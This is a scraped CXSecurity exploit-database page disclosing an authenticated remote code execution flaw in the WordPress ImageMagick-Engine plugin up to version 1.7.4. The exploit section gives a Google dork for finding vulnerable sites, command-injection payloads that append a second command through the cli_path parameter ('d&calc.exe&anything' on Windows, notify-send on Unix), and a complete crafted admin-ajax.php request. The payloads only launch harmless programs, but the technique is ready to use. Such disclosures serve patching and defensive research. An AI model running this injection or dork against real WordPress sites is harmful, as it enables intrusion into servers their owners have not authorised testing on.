---
title: Wordpress Plugin ImageMagick-Engine 1.7.4 Remote Code Execution (RCE) (Authenticated)
url: https://cxsecurity.com/issue/WLB-2022100052
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-10-19
fetch_date: 2025-10-03T20:12:11.137717
---

# Wordpress Plugin ImageMagick-Engine 1.7.4 Remote Code Execution (RCE) (Authenticated)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Wordpress Plugin ImageMagick-Engine 1.7.4 Remote Code Execution (RCE) (Authenticated)** **2022.10.18**  Credit:  **[ABDO10](https://cxsecurity.com/author/ABDO10/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A**  **[**Dork:** inurl:"/wp-content/plugins/imagemagick-engine/"](https://cxsecurity.com/dorks/)** | |

# Exploit Title: Wordpress Plugin ImageMagick-Engine 1.7.4 - Remote Code Execution (RCE) (Authenticated)
# Google Dork: inurl:"/wp-content/plugins/imagemagick-engine/"
# Date: Thursday, September 1, 2022
# Exploit Author: ABDO10
# Vendor Homepage: https://wordpress.org/plugins/imagemagick-engine/
# Software Link: https://github.com/orangelabweb/imagemagick-engine/
# Version: <= 1.7.4
# Tested on: windows 10
-- vulnerable section
https://github.com/orangelabweb/imagemagick-engine/commit/73c1d837e0a23870e99d5d1470bd328f8b2cbcd4#diff-83bcdfbbb7b8eaad54df4418757063ad8ce7f692f189fdce2f86b2fe0bcc0a4dR529
-- payload on windows: d&calc.exe&anything
-- on unix : notify-send "done"
-- exploit :
GET /wp/wordpress/wp-admin/admin-ajax.php?action=ime\_test\_im\_path&cli\_path=[payload]
HTTP/1.1
Host: localhost
Cookie: wordpress\_sec\_xx=; wp-settings-time-1=;
wordpress\_test\_cookie=; wordpress\_logged\_in\_xx=somestuff
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0)
Gecko/20100101 Firefox/104.0
Accept: \*/\*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://localhost/wp/wordpress/wp-admin/options-general.php?page=imagemagick-engine
X-Requested-With: XMLHttpRequest
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022100052)

[Tweet](https://twitter.com/share)

Vote for this issue:
 2
 -2

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top